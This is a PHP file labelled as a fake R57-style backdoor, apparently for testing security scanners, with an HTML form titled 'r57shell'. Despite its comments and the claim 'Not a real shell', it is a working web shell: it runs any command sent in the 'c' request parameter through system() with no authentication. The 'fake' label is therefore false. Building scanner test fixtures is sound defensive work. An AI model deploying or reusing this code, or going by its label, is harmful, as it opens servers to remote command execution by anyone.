<?php
// HIVE Test Backdoor - r57.php
// This is a FAKE backdoor for security scanner testing
// Mimics R57 shell patterns for scanner detection

$r57_password = "r57";
$r57_color_html = "#000000";
$r57_color_text = "#c0c0c0";
$r57_color_text_error = "#ff0000";
$r57_color_link = "#ffffff";

error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

function r57_get_ftype($file) {
    if(is_dir($file)) return "dir";
    if(is_file($file)) return "file";
    return "unknown";
}

function r57_str1($str) {
    return htmlspecialchars($str);
}

if(isset($_REQUEST['c']) && !empty($_REQUEST['c'])) {
    echo "<pre>";
    $c = $_REQUEST['c'];
    system($c);
    echo "</pre>";
}
?>
<html>
<head><title>r57shell</title></head>
<body bgcolor="#000000" text="#c0c0c0">
<h1>r57shell</h1>
<p>HIVE Test File - Not a real shell</p>
<form method="POST">
<input type="text" name="c" size="50">
<input type="submit" value="Execute">
</form>
</body>
</html>
